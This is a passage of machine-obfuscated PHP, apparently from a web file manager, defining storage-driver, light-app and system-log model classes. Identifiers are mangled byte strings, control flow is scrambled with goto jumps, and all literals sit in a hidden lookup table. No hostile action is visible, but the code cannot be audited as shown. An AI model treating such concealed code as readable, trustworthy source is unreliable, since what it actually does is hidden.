$e™÷Ë½ğ ) { $aãŸªìÏÇ§ =& $_SERVER[£Õıúå]; return $aãŸªìÏÇ§[13](array($aãŸªìÏÇ§[14], $aãŸªìÏÇ§[384]), $dÑÓ‡ËŒƒ, $e™÷Ë½ğ ); } public function ziyd028e5aa3($f¸÷ÔğëÏò, $f«ø³’®Š) { $a©öÇ¸ªã¸ =& $_SERVER[£Õıúå]; return $a©öÇ¸ªã¸[13](array($a©öÇ¸ªã¸[385], $a©öÇ¸ªã¸[386]), $f¸÷ÔğëÏò, $f«ø³’®Š); } public function bfjkeaff333d($AÏğà’—î¬, $bñÜÀÚ­ÄÉ) { $b–Ì´Ô‰ =& $_SERVER[£Õıúå]; return $b–Ì´Ô‰[13](array($b–Ì´Ô‰[385], $b–Ì´Ô‰[387]), $AÏğà’—î¬, $bñÜÀÚ­ÄÉ); } } goto DÏº¼…ñå; B¶Ú£«ÈŸ: class StorageModel extends ModelBaseLight { public $optionType = "\123\x79\163\x74\x65\x6d\56\x73\164\157\x72\x61\147\x65\x4c\151\x73\x74"; public $field = array("\156\141\x6d\x65", "\x73\x69\x7a\x65\115\x61\x78", "\x73\171\163\164\145\155", "\144\x65\146\141\x75\x6c\x74", "\x64\x72\x69\x76\x65\162", "\143\x6f\x6e\146\151\x67"); public function listData($fŠõÕ”«¡½ = false, $EŒ»ŒÏ‡‰· = "\x6d\x6f\x64\x69\x66\x79\x54\x69\155\145", $EàÉ­†Ò‘Ï = false) { $Aäø§„ÒªÛ =& $_SERVER[Ö‘Øù]; $E¸‚·ÜŞ¦ = parent::listData($fŠõÕ”«¡½, $EŒ»ŒÏ‡‰·, $EàÉ­†Ò‘Ï); if ($fŠõÕ”«¡½) { return $E¸‚·ÜŞ¦; } $Eì¢Ï Î½ = $this->ioSizeUseGet(array_to_keyvalue($E¸‚·ÜŞ¦, $Aäø§„ÒªÛ[33], $Aäø§„ÒªÛ[395])); foreach ($E¸‚·ÜŞ¦ as $A™î¥´Èò => $dÊ—İø¥öœ) { unset($E¸‚·ÜŞ¦[$A™î¥´Èò][$Aäø§„ÒªÛ[6]]); $E¸‚·ÜŞ¦[$A™î¥´Èò][$Aäø§„ÒªÛ[1716]] = isset($Eì¢Ï Î½[$dÊ—İø¥öœ[$Aäø§„ÒªÛ[395]]]) ? $Eì¢Ï Î½[$dÊ—İø¥öœ[$Aäø§„ÒªÛ[395]]] : 0; } return $E¸‚·ÜŞ¦; } public function ioSizeUseGet($e…®‰Š´) { goto A º®Ê‡åœ; A º®Ê‡åœ: $CÓ¼æ‡ê‚° =& $_SERVER[Ö‘Øù]; if (!$e…®‰Š´) { return array(); } $aìßÜ„éšâ = $CÓ¼æ‡ê‚°[2030] . implode($CÓ¼æ‡ê‚°[47], $e…®‰Š´); goto EÊâ›­õÙš; EÊâ›­õÙš: $C‚Ëó—î«Ñ = Cache::get($aìßÜ„éšâ); if ($C‚Ëó—î«Ñ) { return $C‚Ëó—î«Ñ; } $d‚®§„ãé = array($CÓ¼æ‡ê‚°[817] => $CÓ¼æ‡ê‚°[395], $CÓ¼æ‡ê‚°[2031] => $CÓ¼æ‡ê‚°[78]); goto bó¸Å§¡ÕÅ; bó¸Å§¡ÕÅ: $A–Ãó‰¯µ« = array($CÓ¼æ‡ê‚°[817] => array($CÓ¼æ‡ê‚°[7], $e…®‰Š´)); $C‚Ëó—î«Ñ = Model($CÓ¼æ‡ê‚°[780])->field($d‚®§„ãé)->where($A–Ãó‰¯µ«)->group($CÓ¼æ‡ê‚°[817])->select(); $C‚Ëó—î«Ñ = array_to_keyvalue($C‚Ëó—î«Ñ, $CÓ¼æ‡ê‚°[395], $CÓ¼æ‡ê‚°[78]); goto C•Á¨ÔÒ“ï; C•Á¨ÔÒ“ï: Cache::set($aìßÜ„éšâ, $C‚Ëó—î«Ñ, 600); return $C‚Ëó—î«Ñ; goto FŒ‰ò¾ğÂ´; FŒ‰ò¾ğÂ´: } public function getConfig($F©‡éóƒæ) { $Bº±†Æ‚æç = parent::listData($F©‡éóƒæ); return json_decode($Bº±†Æ‚æç[$_SERVER[Ö‘Øù][6]], !0); } public function update($D¼¨·íˆ¤, $dê»¸Í—İ) { goto dß×ôãô®°; Cœ‹ã†×î: $a¾’åÈ®¤õ = parent::update($D¼¨·íˆ¤, $dê»¸Í—İ); if ($a¾’åÈ®¤õ && $dê»¸Í—İ[$dî™™Ö´Ë[34]]) { foreach ($cõ›ãÕŸ¹¯ as $AšºôÌÔõ) { if ($AšºôÌÔõ[$dî™™Ö´Ë[34]] && $AšºôÌÔõ[$dî™™Ö´Ë[395]] != $D¼¨·íˆ¤) { parent::update($AšºôÌÔõ[$dî™™Ö´Ë[395]], array($dî™™Ö´Ë[34] => 0)); } } } return $a¾’åÈ®¤õ; goto eŸ§“±İè±; Cõ‹•íñŠ¼: if (isset($cõ›ãÕŸ¹¯[$fò¯õ‰˜½]) && $cõ›ãÕŸ¹¯[$fò¯õ‰˜½][$dî™™Ö´Ë[395]] != $D¼¨·íˆ¤) { return !1; } if (isset($dê»¸Í—İ[$dî™™Ö´Ë[2032]]) && $dê»¸Í—İ[$dî™™Ö´Ë[2032]] == $dî™™Ö´Ë[87]) { $this->checkConfig($dê»¸Í—İ); } unset($dê»¸Í—İ[$dî™™Ö´Ë[2032]]); goto Cœ‹ã†×î; dß×ôãô®°: $dî™™Ö´Ë =& $_SERVER[Ö‘Øù]; $fò¯õ‰˜½ = $dê»¸Í—İ[$dî™™Ö´Ë[28]]; $cõ›ãÕŸ¹¯ = array_to_keyvalue(parent::listData(), $dî™™Ö´Ë[28]); goto Cõ‹•íñŠ¼; eŸ§“±İè±: } public function add($b‡Æ¿…‡é½) { goto Bƒ¢›ö¾°‘; a„‰ ÅˆÓ: $this->checkConfig($b‡Æ¿…‡é½); $bÀ£×î¤‹  = parent::insert($b‡Æ¿…‡é½); if ($bÀ£×î¤‹  && $b‡Æ¿…‡é½[$dÊ†”’Úå»[34]]) { foreach ($E‹ÆÛ¼Ñò¯ as $E“†˜ºâ¸) { if ($E“†˜ºâ¸[$dÊ†”’Úå»[34]]) { parent::update($E“†˜ºâ¸[$dÊ†”’Úå»[395]], array($dÊ†”’Úå»[34] => 0)); } } } goto dÖ³æÔÕ·ó; Bƒ¢›ö¾°‘: $dÊ†”’Úå» =& $_SERVER[Ö‘Øù]; $E‹ÆÛ¼Ñò¯ = array_to_keyvalue(parent::listData(), $dÊ†”’Úå»[28]); if (isset($E‹ÆÛ¼Ñò¯[$b‡Æ¿…‡é½[$dÊ†”’Úå»[28]]])) { return !1; } goto a„‰ ÅˆÓ; dÖ³æÔÕ·ó: return $bÀ£×î¤‹ ; goto EÌ‡µ” çä; EÌ‡µ” çä: } public function checkConfig(&$DçÅ‹¶ì†ô, $a„›øÀ—ˆ¾ = false) { goto cƒÒóÁ³‚; BÎğÈÌŸè§: $DçÅ‹¶ì†ô[$fªäÛªùŞÉ[6]] = json_encode($C¶İòã ²‹); $DçÅ‹¶ì†ô[$fªäÛªùŞÉ[94]] = $F‹ Öàö”Ù; return !0; goto DíØ¶±²; e“Ù©ßÙšÏ: $Fˆ­ ¸šğ‘ = new $A‘”«‡ÔÜÏ($C¶İòã ²‹); if (in_array($C¶ƒèİ½ñ¨, $Fˆ­ ¸šğ‘->objectDriver)) { if (!$Fˆ­ ¸šğ‘->isBucketCors() && !$Fˆ­ ¸šğ‘->setBucketCors()) { $EŒ†ÕŒÛ”¸ = LNG($fªäÛªùŞÉ[2037]); $EŒ†ÕŒÛ”¸ .= $fªäÛªùŞÉ[2038] . LNG($fªäÛªùŞÉ[2039]); if ($a„›øÀ—ˆ¾) { return $EŒ†ÕŒÛ”¸; } show_json($EŒ†ÕŒÛ”¸, !1); } } $dˆÓßÛª¯¤ = rtrim($C¶İòã ²‹[$fªäÛªùŞÉ[1110]], $fªäÛªùŞÉ[8]) . $fªäÛªùŞÉ[8]; goto bµ¸ßÎÀšİ; bµ¸ßÎÀšİ: $C„ä†äùÖ = $Fˆ­ ¸šğ‘->getPath($dˆÓßÛª¯¤ . $fªäÛªùŞÉ[1172]); if (!$Fˆ­ ¸šğ‘->mkfile($C„ä†äùÖ)) { if ($a„›øÀ—ˆ¾) { return LNG($fªäÛªùŞÉ[2037]); } show_json(LNG($fªäÛªùŞÉ[2037]), !1); } $C¶İòã ²‹[$fªäÛªùŞÉ[1110]] = $dˆÓßÛª¯¤; goto BÎğÈÌŸè§; aÜãƒİ¶Ã: foreach ($C¶İòã ²‹ as $a ¨ƒ«ª÷ö => $Bêéºõó±) { $C¶İòã ²‹[$a ¨ƒ«ª÷ö] = trim($Bêéºõó±); } $C¶İòã ²‹[$fªäÛªùŞÉ[2033]] = rand_string(6); $fõãÒ¿¤å = $GLOBALS[$fªäÛªùŞÉ[6]][$fªäÛªùŞÉ[88]][$fªäÛªùŞÉ[826]]; goto DãÇÑ­Ç…Ã; DãÇÑ­Ç…Ã: $F‹ Öàö”Ù = isset($fõãÒ¿¤å[$C¶ƒèİ½ñ¨]) ? $fõãÒ¿¤å[$C¶ƒèİ½ñ¨] : ucfirst($C¶ƒèİ½ñ¨); $A‘”«‡ÔÜÏ = $fªäÛªùŞÉ[72] . $F‹ Öàö”Ù; if (!$F‹ Öàö”Ù || !class_exists($A‘”«‡ÔÜÏ)) { if ($a„›øÀ—ˆ¾) { return LNG($fªäÛªùŞÉ[2034]); } write_log(array($fªäÛªùŞÉ[2035], $DçÅ‹¶ì†ô, get_caller_info()), $fªäÛªùŞÉ[2036]); show_json(LNG($fªäÛªùŞÉ[2034]), !1, $DçÅ‹¶ì†ô); } goto e“Ù©ßÙšÏ; cƒÒóÁ³‚: $fªäÛªùŞÉ =& $_SERVER[Ö‘Øù]; $C¶ƒèİ½ñ¨ = strtolower($DçÅ‹¶ì†ô[$fªäÛªùŞÉ[94]]); $C¶İòã ²‹ = json_decode($DçÅ‹¶ì†ô[$fªäÛªùŞÉ[6]], !0); goto aÜãƒİ¶Ã; DíØ¶±²: } public function driverListSystem() { $AÊÕÜâùƒ =& $_SERVER[Ö‘Øù]; $E·‹‘ºÜãÀ = parent::listData(); $eÒŠÀ©¿åè = array(); foreach ($E·‹‘ºÜãÀ as $bŸËƒ©ŞÅ) { unset($bŸËƒ©ŞÅ[$AÊÕÜâùƒ[194]], $bŸËƒ©ŞÅ[$AÊÕÜâùƒ[84]]); $bŸËƒ©ŞÅ[$AÊÕÜâùƒ[6]] = json_decode($bŸËƒ©ŞÅ[$AÊÕÜâùƒ[6]], !0); $eÒŠÀ©¿åè[] = $bŸËƒ©ŞÅ; } return $eÒŠÀ©¿åè; } public function defaultDriver() { $bÆ†ù§òƒ =& $_SERVER[Ö‘Øù]; $F…É¢‹Ûè® = parent::listData(); $B§í¿¶¤ÂÑ = array_filter_by_field($F…É¢‹Ûè®, $bÆ†ù§òƒ[34], 1); $B§í¿¶¤ÂÑ = $B§í¿¶¤ÂÑ[0]; if ($B§í¿¶¤ÂÑ) { $B§í¿¶¤ÂÑ[$bÆ†ù§òƒ[6]] = json_decode($B§í¿¶¤ÂÑ[$bÆ†ù§òƒ[6]], !0); } return $B§í¿¶¤ÂÑ; } public function driverInfo($FÍ´…Á³µê) { $cî«¤©…Î­ =& $_SERVER[Ö‘Øù]; $Eš±è§Ãöù = array_to_keyvalue(parent::listData(), $cî«¤©…Î­[395]); if (!isset($Eš±è§Ãöù[$FÍ´…Á³µê])) { return !1; } $eÌ¹¯¦Ú…» = $Eš±è§Ãöù[$FÍ´…Á³µê]; $eÌ¹¯¦Ú…»[$cî«¤©…Î­[6]] = json_decode($eÌ¹¯¦Ú…»[$cî«¤©…Î­[6]], !0); return $eÌ¹¯¦Ú…»; } public function remove($b¿çéˆ·êã) { $this->removeShareItems($b¿çéˆ·êã); return parent::remove($b¿çéˆ·êã); } public function removeWithFile($E¢ÜƒÌøÜÄ, $c×ÇĞ†¥½) { goto e×±®à±Î¨; aÈÜˆŸÑ¨˜: $b×Ø‚‚‹›÷ = Model($a«”×”†¥Š[193])->where($FùŠó³â§×)->field($a«”×”†¥Š[2042])->select(); foreach ($b×Ø‚‚‹›÷ as $AŸÏÄ°‰„è) { goto eï˜í«Ş†¾; D‰øÒŠã¹í: $fåŠ–†™…µ = array($a«”×”†¥Š[817] => $F…Ä¼Å³Êµ, $a«”×”†¥Š[76] => $A™ÊÄª‘Æ¼); Model($a«”×”†¥Š[193])->where($FùŠó³â§×)->save($fåŠ–†™…µ); goto C™†¶‰ÒìŸ; eÉâ›ÜÛ: if (IO::exist($A™ÊÄª‘Æ¼)) { $FŠÁ¦ÌèÉ->updateFileEnd($AŸÏÄ°‰„è[$a«”×”†¥Š[28]], $AŸÏÄ°‰„è[$a«”×”†¥Š[78]]); continue; } if (!IO::move($eœ¯¾©¶®‹, get_path_father($A™ÊÄª‘Æ¼))) { $DÈ„ĞÅ»ºİ = !1; break; } $FùŠó³â§× = array($a«”×”†¥Š[462] => $AŸÏÄ°‰„è[$a«”×”†¥Š[462]]); goto D‰øÒŠã¹í; eï˜í«Ş†¾: $eœ¯¾©¶®‹ = $AŸÏÄ°‰„è[$a«”×”†¥Š[76]]; $A™ÊÄª‘Æ¼ = $CĞ³ÑÍâÏï . str_replace("\x7b\x69\157\72{$E¢ÜƒÌøÜÄ}\x7d\x2f", $a«”×”†¥Š[33], $eœ¯¾©¶®‹); if (!IO::exist($eœ¯¾©¶®‹)) { $eÒŸŒ™£Ğ[] = $AŸÏÄ°‰„è[$a«”×”†¥Š[462]]; $FŠÁ¦ÌèÉ->updateFileEnd($AŸÏÄ°‰„è[$a«”×”†¥Š[28]], $AŸÏÄ°‰„è[$a«”×”†¥Š[78]]); continue; } goto eÉâ›ÜÛ; C™†¶‰ÒìŸ: } $this->removeByFileID($eÒŸŒ™£Ğ); goto a®ÛÚ¹ÌØ; e×±®à±Î¨: $a«”×”†¥Š =& $_SERVER[Ö‘Øù]; $FùŠó³â§× = array($a«”×”†¥Š[817] => $E¢ÜƒÌøÜÄ); $E¡ˆ—ÑâÑ = Model($a«”×”†¥Š[465])->where($FùŠó³â§×)->count(); goto D…åô‚Ñ×; B‰ÔÑ°—˜©: $CĞ³ÑÍâÏï = "\173\x69\157\72{$F…Ä¼Å³Êµ}\175\57"; $DÈ„ĞÅ»ºİ = !0; $eÒŸŒ™£Ğ = array(); goto aÈÜˆŸÑ¨˜; CöÏâÊãÛ»: $FŠÁ¦ÌèÉ->task[$a«”×”†¥Š[756]] = (double) $dÁâÂæË©ã; $BÔ«çÑß = KodIO::defaultDriver(); $F…Ä¼Å³Êµ = $BÔ«çÑß[$a«”×”†¥Š[395]]; goto B‰ÔÑ°—˜©; D…åô‚Ñ×: $dÁâÂæË©ã = Model($a«”×”†¥Š[465])->where($FùŠó³â§×)->sum($a«”×”†¥Š[78]); $FÇÊÎç±¦ = $c×ÇĞ†¥½ . $a«”×”†¥Š[2040] . $E¢ÜƒÌøÜÄ; $FŠÁ¦ÌèÉ = new TaskFileTransfer($FÇÊÎç±¦, $a«”×”†¥Š[2036], $E¡ˆ—ÑâÑ, LNG($a«”×”†¥Š[2041]) . "\50{$E¢ÜƒÌøÜÄ}\51"); goto CöÏâÊãÛ»; a®ÛÚ¹ÌØ: if (!$DÈ„ĞÅ»ºİ) { $FŠÁ¦ÌèÉ->stop($FÇÊÎç±¦); return !1; } $FŠÁ¦ÌèÉ->end(); if ($c×ÇĞ†¥½ == $a«”×”†¥Š[1696]) { $this->remove($E¢ÜƒÌøÜÄ); } goto E§Ÿ³Óô† ; E§Ÿ³Óô† : } public function progress($e“İœ›Úç, $AŸªÀ¨§¡—) { return Task::get($AŸªÀ¨§¡— . $_SERVER[Ö‘Øù][2040] . $e“İœ›Úç); } private function removeByFileID($DÁ²• ¬Ø = array()) { goto E¶Œ÷ÊîğÇ; aƒ‚Äï§º: foreach ($eÌ¯Ø÷ß  as $bâââ¤ö¯) { Model($Eä¿Õ¿Èè«[411])->removeNow($bâââ¤ö¯, !1); } goto dµó¢ÔÑ; c¦ª·ØŸŒ¬: $eÌ¯Ø÷ß  = Model($Eä¿Õ¿Èè«[1240])->where($eŞàåá£¿‡)->field($Eä¿Õ¿Èè«[397])->select(); if (!$eÌ¯Ø÷ß ) { return; } $eÌ¯Ø÷ß  = array_to_keyvalue($eÌ¯Ø÷ß , $Eä¿Õ¿Èè«[33], $Eä¿Õ¿Èè«[397]); goto aƒ‚Äï§º; E¶Œ÷ÊîğÇ: $Eä¿Õ¿Èè« =& $_SERVER[Ö‘Øù]; if (empty($DÁ²• ¬Ø)) { return; } $eŞàåá£¿‡ = array($Eä¿Õ¿Èè«[462] => array($Eä¿Õ¿Èè«[7], $DÁ²• ¬Ø)); goto c¦ª·ØŸŒ¬; dµó¢ÔÑ: } private function removeShareItems($E·‰½’„Æ) { goto C‰ö»åÉó; AÇ¾ÒÔôÄĞ: Model($dÊ¦§ñÂ[590])->remove($fÎ»ãÔ); goto eèµğÚ¥¡Ü; C‰ö»åÉó: $dÊ¦§ñÂ =& $_SERVER[Ö‘Øù]; $CÅ›‚¬ªÀ¿ = "\173\x69\157\x3a{$E·‰½’„Æ}\175\x2f"; $b²‚âË´ì = array($dÊ¦§ñÂ[397] => 0, $dÊ¦§ñÂ[1105] => array($dÊ¦§ñÂ[381], "{$CÅ›‚¬ªÀ¿}\45")); goto Dñè²¼š„Ë; Dñè²¼š„Ë: $e„–˜¨ù– = Model($dÊ¦§ñÂ[1707])->where($b²‚âË´ì)->field($dÊ¦§ñÂ[483])->select(); if (empty($e„–˜¨ù–)) { return; } $fÎ»ãÔ = array_to_keyvalue($e„–˜¨ù–, $dÊ¦§ñÂ[33], $dÊ¦§ñÂ[483]); goto AÇ¾ÒÔôÄĞ; eèµğÚ¥¡Ü: } } class SystemLightAppModel extends ModelBaseLight { public $optionType = "\123\171\x73\164\x65\x6d\56\x4c\x69\x67\150\164\x41\160\160"; public $modelType = "\x53\171\163\x74\x65\155\117\x70\x74\151\x6f\156"; public $field = array("\156\141\x6d\145", "\147\x72\157\165\160", "\144\145\x73\x63", "\x63\x6f\156\164\x65\156\x74"); public function listData($aóàŞ‰×°¤ = false, $A¦¼•äë‰— = "\x6d\x6f\x64\151\x66\171\x54\x69\x6d\x65", $eæ—ÒÖº÷ = true) { return parent::listData($aóàŞ‰×°¤, $A¦¼•äë‰—, $eæ—ÒÖº÷); } public function remove($A±ŒìËî½Õ) { $Dò•Œ—‹æÄ = $this->findByName($A±ŒìËî½Õ); if (!$Dò•Œ—‹æÄ) { return !1; } return parent::remove($Dò•Œ—‹æÄ[$_SERVER[Ö‘Øù][395]]); } public function add($Bñê¿º±•µ) { if ($this->findByName($Bñê¿º±•µ[$_SERVER[Ö‘Øù][28]])) { return !1; } return parent::insert($Bñê¿º±•µ); } public function update($f…™ªìÓµ, $eÀã¯¢¤Æö) { $b¦³ºª˜Æ… =& $_SERVER[Ö‘Øù]; $DñÙğöÅô° = $this->findByName($f…™ªìÓµ); $b‹„”¡ÏË” = $this->findByName($eÀã¯¢¤Æö[$b¦³ºª˜Æ…[28]]); if (!$DñÙğöÅô° || $b‹„”¡ÏË” && $b‹„”¡ÏË”[$b¦³ºª˜Æ…[395]] != $DñÙğöÅô°[$b¦³ºª˜Æ…[395]]) { return !1; } return parent::update($DñÙğöÅô°[$b¦³ºª˜Æ…[395]], $eÀã¯¢¤Æö); } } class SystemLogModel extends ModelBase { protected $tableName = "\163\x79\x73\164\x65\155\137\x6c\157\x67"; protected $dataAuto = array(array("\x63\x72\145\141\x74\x65\x54\151\155\x65", "\164\x69\x6d\x65", "\151\x6e\x73\x65\162\x74", "\x66\x75\156\x63\x74\151\x6f\x6e")); public $typeList; function __construct() { parent::__construct(); $this->typeList = $this->typeListAll(); } public function typeListAll() { $c‹†ô·õµä =& $_SERVER[Ö‘Øù]; return array($c‹†ô·õµä[2043] => LNG($c‹†ô·õµä[2044]), $c‹†ô·õµä[2045] => LNG($c‹†ô·õµä[2046]), $c‹†ô·õµä[1670] => LNG($c‹†ô·õµä[2047]), $c‹†ô·õµä[2048] => LNG($c‹†ô·õµä[2049]), $c‹†ô·õµä[2050] => LNG($c‹†ô·õµä[2051]), $c‹†ô·õµä[2052] => LNG($c‹†ô·õµä[2053]), $c‹†ô·õµä[2054] => LNG($c‹†ô·õµä[2055]), $c‹†ô·õµä[1700] => LNG($c‹†ô·õµä[2055]), $c‹†ô·õµä[1701] => LNG($c‹†ô·õµä[2056]), $c‹†ô·õµä[2057] => LNG($c‹†ô·õµä[2058]), $c‹†ô·õµä[2059] => LNG($c‹†ô·õµä[2060]), $c‹†ô·õµä[2061] => LNG($c‹†ô·õµä[2062]), $c‹†ô·õµä[2063] => LNG($c‹†ô·õµä[2064]), $c‹†ô·õµä[1698] => LNG($c‹†ô·õµä[2065]), $c‹†ô·õµä[2066] => LNG($c‹†ô·õµä[2067]), $c‹†ô·õµä[1705] => LNG($c‹†ô·õµä[2068]), $c‹†ô·õµä[2069] => LNG($c‹†ô·õµä[2070]), $c‹†ô·õµä[2071] => LNG($c‹†ô·õµä[2072]), $c‹†ô·õµä[2073] => LNG($c‹†ô·õµä[2074]), $c‹†ô·õµä[2075] => LNG($c‹†ô·õµä[2076]), $c‹†ô·õµä[1708] => LNG($c‹†ô·õµä[2077]), $c‹†ô·õµä[1709] => LNG($c‹†ô·õµä[2078]), $c‹†ô·õµä[2079] => LNG($c‹†ô·õµä[2080]), $c‹†ô·õµä[2081] => LNG($c‹†ô·õµä[2082]), $c‹†ô·õµä[2083] => LNG($c‹†ô·õµä[2084]), $c‹†ô·õµä[1703] => LNG($c‹†ô·õµä[2085]), $c‹†ô·õµä[2086] => LNG($c‹†ô·õµä[2087]), $c‹†ô·õµä[1702] => LNG($c‹†ô·õµä[2088]), $c‹†ô·õµä[2089] => LNG($c‹†ô·õµä[2090]), $c‹†ô·õµä[2091] => LNG($c‹†ô·õµä[2092]), $c‹†ô·õµä[2093] => LNG($c‹†ô·õµä[2094]), $c‹†ô·õµä[2095] => LNG($c‹†ô·õµä[2095]), $c‹†ô·õµä[2096] => LNG($c‹†ô·õµä[1674]), $c‹†ô·õµä[2097] => LNG($c‹†ô·õµä[2098]), $c‹†ô·õµä[2099] => LNG($c‹†ô·õµä[2100]), $c‹†ô·õµä[2101] => LNG($c‹†ô·õµä[2102]), $c‹†ô·õµä[2103] => LNG($c‹†ô·õµä[2104]), $c‹†ô·õµä[2105] => LNG($c‹†ô·õµä[2106]), $c‹†ô·õµä[2107] => LNG($c‹†ô·õµä[2107]), $c‹†ô·õµä[2108] => LNG($c‹†ô·õµä[2109]), $c‹†ô·õµä[2110] => LNG($c‹†ô·õµä[2111]), $c‹†ô·õµä[2112] => LNG($c‹†ô·õµä[2113]), $c‹†ô·õµä[2114] => LNG($c‹†ô·õµä[2115]), $c‹†ô·õµä[2116] => LNG($c‹†ô·õµä[2117]), $c‹†ô·õµä[2118] => LNG($c‹†ô·õµä[2119])); } private function typeFile() { $fè±¸Ø« Á =& $_SERVER[Ö‘Øù]; $DŸ•×ä¨ë± = array($fè±¸Ø« Á[1705] => array($fè±¸Ø« Á[1706]), $fè±¸Ø« Á[2061] => array($fè±¸Ø« Á[2120]), $fè±¸Ø« Á[2063] => array($fè±¸Ø« Á[2121]), $fè±¸Ø« Á[1698] => array($fè±¸Ø« Á[1699]), $fè±¸Ø« Á[2071] => array(), $fè±¸Ø« Á[2073] => array(), $fè±¸Ø« Á[2075] => array(), $fè±¸Ø« Á[1708] => array($fè±¸Ø« Á[1710]), $fè±¸Ø« Á[1709] => array($fè±¸Ø« Á[1710]), $fè±¸Ø« Á[2079] => array($fè±¸Ø« Á[2122]), $fè±¸Ø« Á[2081] => array($fè±¸Ø« Á[2122]), $fè±¸Ø« Á[2083] => array($fè±¸Ø« Á[2123]), $fè±¸Ø« Á[2069] => array($fè±¸Ø« Á[2124]), $fè±¸Ø« Á[1703] => array($fè±¸Ø« Á[2125]), $fè±¸Ø« Á[2086] => array($fè±¸Ø« Á[2126]), $fè±¸Ø« Á[1702] => array($fè±¸Ø« Á[1704])); return $DŸ•×ä¨ë±; } private function typeAll() { goto e¾ŠÂØëõ; e¾ŠÂØëõ: $DÓãõÊŞ¹ =& $_SERVER[Ö‘Øù]; $a¹…“ÕÑ‡ = $this->typeList; $eíƒÁœå¦ = array_filter($this->typeFile()); goto dœ•¹ê„ÌÀ; c®ÑÜàùƒ–: return $a¹…“ÕÑ‡; goto Dš³—†Û’; dœ•¹ê„ÌÀ: foreach ($eíƒÁœå¦ as $C¬ëºìäß => $F‚©¾ÃÏíê) { $a¹…“ÕÑ‡[$F‚©¾ÃÏíê[0]] = $a¹…“ÕÑ‡[$C¬ëºìäß]; } $a¹…“ÕÑ‡[$DÓãõÊŞ¹[1710]] = LNG($DÓãõÊŞ¹[2127]); $a¹…“ÕÑ‡[$DÓãõÊŞ¹[2122]] = LNG($DÓãõÊŞ¹[2128]); goto c®ÑÜàùƒ–; Dš³—†Û’: } public function addLog($f‚Ö¼è¢Ãµ, $EÄ†Ìç”øá = array()) { goto Aö¦¼ğµÒ; Aö¦¼ğµÒ: $fë÷¦å©ìë =& $_SERVER[Ö‘Øù]; if (!isset($this->typeList[$f‚Ö¼è¢Ãµ])) { return; } $BÉùæ¯¤ä‘ = defined($fë÷¦å©ìë[469]) && USER_ID ? USER_ID : (isset($EÄ†Ìç”øá[$fë÷¦å©ìë[1561]]) ? $EÄ†Ìç”øá[$fë÷¦å©ìë[1561]] : 0); goto e¬´ öŸ×; e¬´ öŸ×: if (!$BÉùæ¯¤ä‘) { $BÉùæ¯¤ä‘ = (int) Session::get($fë÷¦å©ìë[1861]); } $B¬Ì¸¤ÂÈ = get_client_ip(); if (!$EÄ†Ìç”øá || strlen(json_encode($EÄ†Ìç”øá)) >= 1024) { $EÄ†Ìç”øá = array($fë÷¦å©ìë[2129] => $B¬Ì¸¤ÂÈ); } else { if (is_array($EÄ†Ìç”øá)) { $EÄ†Ìç”øá[$fë÷¦å©ìë[2129]] = $B¬Ì¸¤ÂÈ; } else { $EÄ†Ìç”øá = array($fë÷¦å©ìë[1122] => $EÄ†Ìç”øá, $fë÷¦å©ìë[2129] => $B¬Ì¸¤ÂÈ); } } goto f‹·•‰Ÿ°£; f‹·•‰Ÿ°£: $EÄ†Ìç”øá = array($fë÷¦å©ìë[1551] => Session::sign(), $fë÷¦å©ìë[1552] => $BÉùæ¯¤ä‘, $fë÷¦å©ìë[29] => $f‚Ö¼è¢Ãµ, $fë÷¦å©ìë[1554] => json_encode($EÄ†Ìç”øá)); parent::add($EÄ†Ìç”øá); goto C¤¾¦ğä­; C¤¾¦ğä­: } public function remove($c³ïôÈÑºë) { $this->where(array($_SERVER[Ö‘Øù][414] => $c³ïôÈÑºë))->delete(); } private function _makeOrder($a”àÔŠ‹§“ = '') { goto c¤ˆæíñ¥—; c¤ˆæíñ¥—: $f×øøÆÓ» =& $_SERVER[Ö‘Øù]; $f¤™âŒ¡Ä‘ = $f×øøÆÓ»[194]; $E”âˆÄŠ¿Ö = array($f×øøÆÓ»[443] => $f×øøÆÓ»[444], $f×øøÆÓ»[445] => $f×øøÆÓ»[446]); goto CæÃ¿Æš°–; CæÃ¿Æš°–: $Eë˜Ãß¿× = Input::get($f×øøÆÓ»[451], $f×øøÆÓ»[7], $f×øøÆÓ»[1893], array($f×øøÆÓ»[1817], $f×øøÆÓ»[445])); $Eë˜Ãß¿× = $E”âˆÄŠ¿Ö[$Eë˜Ãß¿×]; $a”àÔŠ‹§“ = $a”àÔŠ‹§“ . "{$f¤™âŒ¡Ä‘}\x20{$Eë˜Ãß¿×}"; goto DÎ¹Áòêµ; DÎ¹Áòêµ: return $this->order($a”àÔŠ‹§“); goto F¡Àè²¼¢; F¡Àè²¼¢: } public function get($E‚‰”ë¼†¯ = '') { goto B ‘±£ª”Š; BôŞ¢³Ë¤ï: if ($E‚‰”ë¼†¯[$CŞÃ¡ßÇÑ[1561]]) { $bÌÚ‘—İí[$CŞÃ¡ßÇÑ[1561]] = $E‚‰”ë¼†¯[$CŞÃ¡ßÇÑ[1561]]; } if (isset($E‚‰”ë¼†¯[$CŞÃ¡ßÇÑ[754]])) { $bí„Œö¯ = $E‚‰”ë¼†¯[$CŞÃ¡ßÇÑ[754]]; $b­œ¡¬Ú = isset($E‚‰”ë¼†¯[$CŞÃ¡ßÇÑ[491]]) ? $E‚‰”ë¼†¯[$CŞÃ¡ßÇÑ[491]] : time(); $bÌÚ‘—İí[$CŞÃ¡ßÇÑ[194]] = array($CŞÃ¡ßÇÑ[331], array($bí„Œö¯, $b­œ¡¬Ú)); } if ($E‚‰”ë¼†¯[$CŞÃ¡ßÇÑ[29]]) { $eŒ‚œÙ£‰¶ = explode($CŞÃ¡ßÇÑ[47], $E‚‰”ë¼†¯[$CŞÃ¡ßÇÑ[29]]); $a²–Çí¤— = $this->typeFile(); $CÇÊˆ­ª² = array(); foreach ($eŒ‚œÙ£‰¶ as $fŠšëåÇë–) { $CÇÊˆ­ª²[] = $fŠšëåÇë–; if (isset($a²–Çí¤—[$fŠšëåÇë–])) { $CÇÊˆ­ª² = array_merge($CÇÊˆ­ª², $a²–Çí¤—[$fŠšëåÇë–]); } } $CÇÊˆ­ª² = array_unique($CÇÊˆ­ª²); if ($CÇÊˆ­ª²) { $bÌÚ‘—İí[$CŞÃ¡ßÇÑ[29]] = array($CŞÃ¡ßÇÑ[7], $CÇÊˆ­ª²); } } else { $bÌÚ‘—İí[$CŞÃ¡ßÇÑ[29]] = array($CŞÃ¡ßÇÑ[2130], $CŞÃ¡ßÇÑ[2131]); } goto aÏÃ‘Éë£; B ‘±£ª”Š: $CŞÃ¡ßÇÑ =& 